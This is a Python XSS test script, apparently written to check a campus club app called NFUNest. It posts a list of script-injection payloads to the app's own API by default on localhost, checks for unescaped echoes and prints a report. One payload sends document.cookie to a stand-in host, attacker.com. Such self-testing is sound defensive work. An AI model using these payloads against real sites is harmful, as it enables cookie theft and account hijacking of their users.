# -*- coding: utf-8 -*-
"""
XSS跨站脚本攻击测试
测试系统对XSS攻击的防护能力
"""
import requests
import html
import sys
import argparse
from urllib.parse import urljoin


class XSSTester:
    """XSS测试类"""
    
    def __init__(self, base_url):
        """
        初始化测试器
        
        Args:
            base_url: 基础URL
        """
        self.base_url = base_url
        self.api_prefix = '/nfunest/api'
        self.results = []
        
        # XSS测试载荷
        self.xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            "'><script>alert(String.fromCharCode(88,83,83))</script>",
            '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>alert(/XSS/)</script>',
            '<script>alert(`XSS`)</script>',
            '<img src=javascript:alert(&quot;XSS&quot;)>',
            "<img src='javascript:alert(\"XSS\")'>",
            '<script>alert(document.cookie)</script>',
            '<script>alert(document.domain)</script>',
            '<script>fetch("http://attacker.com?c="+document.cookie)</script>',
        ]
    
    def _get_full_url(self, endpoint):
        """获取完整URL"""
        return urljoin(self.base_url, f"{self.api_prefix}{endpoint}")
    
    def _check_xss_vulnerability(self, response_text, payload):
        """
        检查是否存在XSS漏洞
        
        Args:
            response_text: 响应文本
            payload: 测试载荷
            
        Returns:
            bool: 是否存在漏洞
        """
        # 检查payload是否原样返回（未转义）
        if payload in response_text:
            return True
        
        # 检查常见的XSS特征
        dangerous_patterns = [
            '<script>',
            'onerror=',
            'onload=',
            'javascript:',
        ]
        
        for pattern in dangerous_patterns:
            if pattern in response_text.lower():
                # 检查是否被HTML实体编码
                escaped_pattern = html.escape(pattern)
                if escaped_pattern not in response_text:
                    return True
        
        return False
    
    def _log_result(self, test_name, payload, endpoint, is_vulnerable, details=''):
        """记录测试结果"""
        result = {
            'test_name': test_name,
            'payload': payload,
            'endpoint': endpoint,
            'is_vulnerable': is_vulnerable,
            'details': details
        }
        self.results.append(result)
        
        status = "漏洞!" if is_vulnerable else "安全"
        print(f"[{status}] {test_name}")
        print(f"  Payload: {payload[:50]}...")
        if details:
            print(f"  详情: {details}")
        print()
    
    def test_club_name_xss(self):
        """测试社团名称XSS"""
        print("=" * 50)
        print("测试社团名称XSS")
        print("=" * 50)
        
        endpoint = '/clubs'
        url = self._get_full_url(endpoint)
        
        for payload in self.xss_payloads[:5]:
            data = {
                'name': payload,
                'shortIntro': '测试简介',
                'description': '测试描述',
                'category': '学术',
                'level': '校级'
            }
            
            try:
                response = requests.post(url, json=data, timeout=10)
                
                # 检查响应中是否包含未转义的payload
                is_vulnerable = self._check_xss_vulnerability(response.text, payload)
                
                self._log_result(
                    "社团名称XSS",
                    payload,
                    endpoint,
                    is_vulnerable,
                    f"状态码: {response.status_code}"
                )
                
            except Exception as e:
                print(f"请求失败: {e}")
    
    def test_announcement_content_xss(self):
        """测试公告内容XSS"""
        print("=" * 50)
        print("测试公告内容XSS")
        print("=" * 50)
        
        endpoint = '/announcements'
        url = self._get_full_url(endpoint)
        
        for payload in self.xss_payloads[:5]:
            data = {
                'title': f'测试公告-{payload[:20]}',
                'content': payload,
                'clubId': 1
            }
            
            try:
                response = requests.post(url, json=data, timeout=10)
                
                is_vulnerable = self._check_xss_vulnerability(response.text, payload)
                
                self._log_result(
                    "公告内容XSS",
                    payload,
                    endpoint,
                    is_vulnerable,
                    f"状态码: {response.status_code}"
                )
                
            except Exception as e:
                print(f"请求失败: {e}")
    
    def test_search_xss(self):
        """测试搜索功能XSS"""
        print("=" * 50)
        print("测试搜索功能XSS")
        print("=" * 50)
        
        endpoint = '/clubs'
        url = self._get_full_url(endpoint)
        
        for payload in self.xss_payloads[:5]:
            data = {
                'search': payload,
                'page': 1,
                'pageSize': 10
            }
            
            try:
                response = requests.post(url, json=data, timeout=10)
                
                is_vulnerable = self._check_xss_vulnerability(response.text, payload)
                
                self._log_result(
                    "搜索XSS",
                    payload,
                    endpoint,
                    is_vulnerable,
                    f"状态码: {response.status_code}"
                )
                
            except Exception as e:
                print(f"请求失败: {e}")
    
    def test_url_parameter_xss(self):
        """测试URL参数XSS"""
        print("=" * 50)
        print("测试URL参数XSS")
        print("=" * 50)
        
        # 测试各种URL参数
        test_urls = [
            '/clubs?page=<script>alert(1)</script>',
            '/events?category=<img src=x onerror=alert(1)>',
            '/announcements?search=<svg onload=alert(1)>',
        ]
        
        for test_url in test_urls:
            url = self._get_full_url(test_url)
            
            try:
                response = requests.get(url, timeout=10)
                
                # 检查响应中是否包含未转义的脚本
                is_vulnerable = '<script>' in response.text or 'onerror=' in response.text
                
                self._log_result(
                    "URL参数XSS",
                    test_url,
                    test_url,
                    is_vulnerable,
                    f"状态码: {response.status_code}"
                )
                
            except Exception as e:
                print(f"请求失败: {e}")
    
    def generate_report(self):
        """生成测试报告"""
        print("\n" + "=" * 50)
        print("XSS安全测试报告")
        print("=" * 50)
        
        total_tests = len(self.results)
        vulnerable_tests = sum(1 for r in self.results if r['is_vulnerable'])
        safe_tests = total_tests - vulnerable_tests
        
        print(f"总测试数: {total_tests}")
        print(f"发现漏洞: {vulnerable_tests}")
        print(f"安全通过: {safe_tests}")
        print()
        
        if vulnerable_tests > 0:
            print("发现漏洞的测试:")
            for result in self.results:
                if result['is_vulnerable']:
                    print(f"  - {result['test_name']}")
                    print(f"    Payload: {result['payload'][:50]}...")
        else:
            print("未发现XSS漏洞，系统防护良好！")
        
        return vulnerable_tests == 0


def main():
    """主函数"""
    parser = argparse.ArgumentParser(description='NFUNest XSS安全测试')
    parser.add_argument('--url', '-u', default='http://localhost:3001', 
                        help='目标URL')
    
    args = parser.parse_args()
    
    print("NFUNest XSS跨站脚本攻击安全测试")
    print(f"目标: {args.url}")
    print()
    
    tester = XSSTester(args.url)
    
    # 执行测试
    tester.test_club_name_xss()
    tester.test_announcement_content_xss()
    tester.test_search_xss()
    tester.test_url_parameter_xss()
    
    # 生成报告
    is_safe = tester.generate_report()
    
    sys.exit(0 if is_safe else 1)


if __name__ == '__main__':
    main()
